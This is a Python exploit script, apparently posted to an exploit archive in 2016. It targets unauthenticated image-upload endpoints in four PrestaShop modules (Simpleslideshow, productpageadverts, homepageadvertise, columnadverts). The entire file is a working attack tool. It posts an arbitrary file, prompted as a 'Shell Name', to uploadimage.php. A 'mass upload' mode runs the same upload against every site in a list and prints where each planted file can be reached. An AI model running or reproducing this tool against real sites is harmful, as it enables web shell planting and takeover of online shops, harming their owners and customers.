#!/usr/bin/python
####################################################################################
#Author  : PentesterDesk
#Date    : 20-June-2016
#Software: Prestashop CMS
#vuln Mod: Simpleslideshow , productpageadverts , Homepageadvertise , columnadverts
####################################################################################
#import sys, os
import time
import requests
def main():
    #os.system('cls' and 'color -a' if os.name == "nt" else 'clear')
 
    banner = '''
 
            +======================================================+
            |    Prestashop  |  FileUpload Exp   |  PentesterDesk  |
            |         Found by : Muhammad Faisal Gunanda           |
            |         Coded by : PentesterDesk Team                |
            |         Contact  : pentesterdesk@gmail.com           |
            +======================================================+
            '''
    print banner
    print "[1] SimpleSlideShow "
    print "[2] Productpageadverts"
    print "[3] HomepageAdvertise"
    print "[4] columnAdverts"
    ch1=raw_input("\n[>] ")
#1 SimpleSlideShow
    if ch1 == '1':
       # os.system('cls' and 'color -a' if os.name == "nt" else 'clear')
        print banner
        print "\n            <==============SimpleSlideShow Exploit=================>\n"
        print "[1] Single Site "
        print "[2] Mass Upload"
        print "[3] GoTo Home"
        ch2=raw_input("\n[>] ")
        if ch2 == '3':
            main()
        if ch2 == '1':
           #os.system('cls' and 'color -a' if os.name == "nt" else 'clear')
            print banner
            print "\n            <==============SimpleSlideShow Exploit=================>\n"
            url = raw_input("[+] Enter Url  : ")
            filname= raw_input("[+] Enter File : ")
            if filname == '' or url == '':
                print "\n[!] Url or File is not entered\n"
                raw_input("[+] Enter Any key to try agian [>] ")
                main()
            #url Logic
            if '/modules/simpleslideshow/' in url:
                url=url.replace('/modules/simpleslideshow/','/modules/simpleslideshow/uploadimage.php')
            elif '/modules/simpleslideshow/uploadimage.php' in url:
                url=url
            else:
                url = url + "/modules/simpleslideshow/uploadimage.php"
            #main
            files={'userfile':(filname, open(filname,'rb'),'multipart/form-data')}
            req=requests.post(url,files=files)
            if req.status_code == 200 or 'success' in req.text:
                url=url.replace('/uploadimage.php','/slides/'+filname)
                print ("[+] %s [ok]" % (url))
            else:
                print "\n[+] %s \n" %url
            raw_input("\n[+] Press Enter [>] ")
            main()
        #Mass upload Logic
        if ch2 == '2':
            #os.system('cls' and 'color -a' if os.name == "nt" else 'clear')
            print banner
            print "\n            <==============SimpleSlideShow Exploit=================>\n"
            filee = raw_input("[+] Enter List  Name : ")
            filname= raw_input("[+] Enter Shell Name : ")
            if filname == '' or filee == '':
                    print "\n[!] Url or File is not entered\n"
                    raw_input("[+] Enter Any key to try agian [>] ")
                    main()
            ob = open(filee,'r')
            lists = ob.readlines()
            list1 = []
            i = 0
            for i in range(len(lists)):
                list1.append(lists[i].strip('\n'))
                 
            count = 0
            for site in (list1):
                count = count + 1
                if '/modules/simpleslideshow/' in site:
                    url=site.replace('/modules/simpleslideshow/','/modules/simpleslideshow/uploadimage.php')
                elif '/modules/simpleslideshow/uploadimage.php' in site:
                    url=site
                else:
                    url = site + "/modules/simpleslideshow/uploadimage.php"
                files={'userfile':(filname, open(filname,'rb'),'multipart/form-data')}
                req=requests.post(url,files=files)
                if req.status_code == 200 or 'success' in req.text:
                    url=url.replace('/uploadimage.php','/slides/'+filname)
                    print ("[%d] %s [ ok ]" % (count,url))
                else:
                    print ("[%d]  %s " % (count,url))
        raw_input("\n[+] Press Enter [>] ")
        main()
                 
#2 productpageadverts
    if ch1 == '2':
        #os.system('cls' and 'color -a' if os.name == "nt" else 'clear')
        print banner
        print "\n            <==============Productpageadverts Exploit==============>\n"
        print "[1] Single Site "
        print "[2] Mass Upload"
        print "[3] GoTo Home"
        ch2=raw_input("\n[>] ")
        if ch2 == '3':
            main()
        if ch2 == '1':
            #os.system('cls' and 'color -a' if os.name == "nt" else 'clear')
            print banner
            print "\n            <==============Productpageadverts Exploit==============>\n"
            url = raw_input("[+] Enter Url  : ")
            filname= raw_input("[+] Enter File : ")
            if filname == '' or url == '':
                print "\n[!] Url or File is not entered\n"
                raw_input("[+] Enter Any key to try agian [>] ")
                main()
            #url Logic
            if '/modules/productpageadverts/' in url:
                url=url.replace('/modules/productpageadverts/','/modules/productpageadverts/uploadimage.php')
            elif '/modules/productpageadverts/uploadimage.php' in url:
                url=url
            else:
                url = url + "/modules/productpageadverts/uploadimage.php"
            #main
            files={'userfile':(filname, open(filname,'rb'),'multipart/form-data')}
            req=requests.post(url,files=files)
            if req.status_code == 200 or 'success' in req.text:
                url=url.replace('/uploadimage.php','/slides/'+filname)
                print ("[+] %s [ ok ]" % (url))
            else:
                print "\n\[+] %s \n" %url
            raw_input("\n[+] Press Enter [>] ")
            main()
        #Mass upload Logic
        if ch2 == '2':
            #os.system('cls' and 'color -a' if os.name == "nt" else 'clear')
            print banner
            print "\n            <==============Productpageadverts Exploit==============>\n"
            filee = raw_input("\033[1;36m[+] Enter List  Name : \033[1;m")
            filname= raw_input("\033[1;36m[+] Enter Shell Name : \033[1;m")
            if filname == '' or filee == '':
                    print "\n\033[1;41m[!] Url or File is not entered\033[1;m\n"
                    raw_input("\033[1;36m[+] Enter Any key to try agian \033[1;m[\033[1;31m>\033[1;m] ")
                    main()
            ob = open(filee,'r')
            lists = ob.readlines()
            list1 = []
            i = 0
            for i in range(len(lists)):
                list1.append(lists[i].strip('\n'))
                 
            count = 0
            for site in (list1):
                count = count + 1
                if '/modules/productpageadverts/' in site:
                    url=site.replace('/modules/productpageadverts/','/modules/productpageadverts/uploadimage.php')
                elif '/modules/simpleslideshow/uploadimage.php' in site:
                    url=site
                else:
                    url = site + "/modules/productpageadverts/uploadimage.php"
                files={'userfile':(filname, open(filname,'rb'),'multipart/form-data')}
                req=requests.post(url,files=files)
                if req.status_code == 200 or 'success' in req.text:
                    url=url.replace('/uploadimage.php','/slides/'+filname)
                    print ("[%d] %s [ ok ]" % (count,url))
                else:
                    print ("[%d]  %s " % (count,url))
        raw_input("\n[+] Press Enter [>] ")
        main()
#3 homepageadvertise
    if ch1 == '3':
        #os.system('cls' and 'color -a' if os.name == "nt" else 'clear')
        print banner
        print "\n            <==============HomePageAdvertise Exploit===============>\n"
        print "[1] Single Site "
        print "[2] Mass Upload"
        print "[3] GoTo Home"
        ch2=raw_input("\n[>] ")
        if ch2 == '3':
            main()
        if ch2 == '1':
            #os.system('cls' and 'color -a' if os.name == "nt" else 'clear')
            print banner
            print "\n            <==============HomePageAdvertise Exploit===============>\n"
            url = raw_input("[+] Enter Url  : ")
            filname= raw_input("[+] Enter File : ")
            if filname == '' or url == '':
                print "\n\033[1;41m[!] Url or File is not entered\033[1;m\n"
                raw_input("\033[1;36m[+] Enter Any key to try agian \033[1;m[\033[1;31m>\033[1;m] ")
                main()
            #url Logic
            if '/modules/homepageadvertise/' in url:
                url=url.replace('/modules/homepageadvertise/','/modules/homepageadvertise/uploadimage.php')
            elif '/modules/homepageadvertise/uploadimage.php' in url:
                url=url
            else:
                url = url + "/modules/homepageadvertise/uploadimage.php"
            #main
            files={'userfile':(filname, open(filname,'rb'),'multipart/form-data')}
            req=requests.post(url,files=files)
            if req.status_code == 200 or 'success' in req.text:
                url=url.replace('/uploadimage.php','/slides/'+filname)
                print ("[+] %s [ ok ]" % (url))
            else:
                print "\n[+] %s \n" %url
            raw_input("\n[+] Press Enter [>] ")
            main()
        #Mass upload Logic
        if ch2 == '2':
            #os.system('cls' and 'color -a' if os.name == "nt" else 'clear')
            print banner
            print "\n            <==============HomePageAdvertise Exploit===============>\n"
            filee = raw_input("[+] Enter List  Name : ")
            filname= raw_input("[+] Enter Shell Name : ")
            if filname == '' or filee == '':
                    print "\n\[!] Url or File is not entered\n"
                    raw_input("[+] Enter Any key to try agian [>] ")
                    main()
            ob = open(filee,'r')
            lists = ob.readlines()
            list1 = []
            i = 0
            for i in range(len(lists)):
                list1.append(lists[i].strip('\n'))
                 
            count = 0
            for site in (list1):
                count = count + 1
                if '/modules/homepageadvertise/' in site:
                    url=site.replace('/modules/homepageadvertise/','/modules/homepageadvertise/uploadimage.php')
                elif '/modules/homepageadvertise/uploadimage.php' in site:
                    url=site
                else:
                    url = site + "/modules/homepageadvertise/uploadimage.php"
                files={'userfile':(filname, open(filname,'rb'),'multipart/form-data')}
                req=requests.post(url,files=files)
                if req.status_code == 200 or 'success' in req.text:
                    url=url.replace('/uploadimage.php','/slides/'+filname)
                    print ("[%d]] %s [ ok ]" % (count,url))
                else:
                    print ("[%d]  %s " % (count,url))
        raw_input("\n[+] Press Enter [>] ")
        main()
#4 columnadverts
    if ch1 == '4':
        #os.system('cls' and 'color -a' if os.name == "nt" else 'clear')
        print banner
        print "\n            <================ColumnAdvers Exploit==================>\n"
        print "[1] Single Site "
        print "[2] Mass Upload"
        print "[3] GoTo Home"
        ch2=raw_input("\n[>] ")
        if ch2 == '3':
            main()
        if ch2 == '1':
            #os.system('cls' and 'color -a' if os.name == "nt" else 'clear')
            print banner
            print "\n            <================ColumnAdvers Exploit==================>\n"
            url = raw_input("[+] Enter Url  : ")
            filname= raw_input("[+] Enter File : ")
            if filname == '' or url == '':
                print "\n[!] Url or File is not entered\n"
                raw_input("[+] Enter Any key to try agian [>] ")
                main()
            #url Logic
            if '/modules/columnadverts/' in url:
                url=url.replace('/modules/columnadverts/','/modules/columnadverts/uploadimage.php')
            elif '/modules/columnadverts/uploadimage.php' in url:
                url=url
            else:
                url = url + "/modules/columnadverts/uploadimage.php"
            #main
            files={'userfile':(filname, open(filname,'rb'),'multipart/form-data')}
            req=requests.post(url,files=files)
            if req.status_code == 200 or 'success' in req.text:
                url=url.replace('/uploadimage.php','/slides/'+filname)
                print ("[+] %s [ ok ]" % (url))
            else:
                print "\n[+] %s \n" %url
            raw_input("\n[+] Press Enter [>] ")
            main()
        #Mass upload Logic
        if ch2 == '2':
            #os.system('cls' and 'color -a' if os.name == "nt" else 'clear')
            print banner
            print "\n            <================ColumnAdvers Exploit==================>\n"
            filee = raw_input("[+] Enter List  Name : ")
            filname= raw_input("[+] Enter Shell Name : ")
            if filname == '' or filee == '':
                    print "\n[!] Url or File is not entered\n"
                    raw_input("[+] Enter Any key to try agian [>] ")
                    main()
            ob = open(filee,'r')
            lists = ob.readlines()
            list1 = []
            i = 0
            for i in range(len(lists)):
                list1.append(lists[i].strip('\n'))
                 
            count = 0
            for site in (list1):
                count = count + 1
                if '/modules/columnadverts/' in site:
                    url=site.replace('/modules/columnadverts/','/modules/columnadverts/uploadimage.php')
                elif '/modules/columnadverts/uploadimage.php' in site:
                    url=site
                else:
                    url = site + "/modules/columnadverts/uploadimage.php"
                files={'userfile':(filname, open(filname,'rb'),'multipart/form-data')}
                req=requests.post(url,files=files)
                if req.status_code == 200 or 'success' in req.text:
                    url=url.replace('/uploadimage.php','/slides/'+filname)
                    print ("[%d] %s [ ok ]" % (count,url))
                else:
                    print ("[%d] %s " % (count,url))
        raw_input("\n[+] Press Enter [>] ")
        main()
if __name__ == "__main__":
    main()
 
#  0day.today [2016-06-25]  #